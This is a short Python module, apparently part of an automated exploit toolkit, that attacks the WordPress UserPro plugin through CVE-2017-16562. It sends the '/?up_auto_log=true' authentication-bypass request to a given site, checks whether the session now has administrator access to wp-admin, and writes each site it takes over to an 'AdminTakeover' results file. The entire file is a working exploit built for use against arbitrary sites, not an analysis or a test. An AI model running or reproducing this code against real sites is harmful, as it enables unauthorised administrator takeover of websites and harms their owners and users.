# coding=utf-8
import requests
import printModule

Headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'
}


def Exploit(site):
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0',
                   'Accept': '*/*'}
        exploit = '/?up_auto_log=true'
        sess = requests.session()
        sess.get('http://' + site, timeout=10, headers=headers)
        admin_re_page = 'http://' + site + '/wp-admin/'
        sess.get('http://' + site + exploit, timeout=10, headers=headers)
        Check_login = sess.get(admin_re_page, timeout=10, headers=headers)
        if '<li id="wp-admin-bar-logout">' in str(Check_login.content):
            with open('result/AdminTakeover_results.txt', 'a') as writer:
                writer.write(site + exploit + '\n')
            return printModule.returnYes(site, 'CVE-2017-16562', 'Wordpress Userpro', 'Wordpress')
        else:
            return printModule.returnNo(site, 'CVE-2017-16562', 'Wordpress Userpro', 'Wordpress')
    except:
        return printModule.returnNo(site, 'CVE-2017-16562', 'Wordpress Userpro', 'Wordpress')

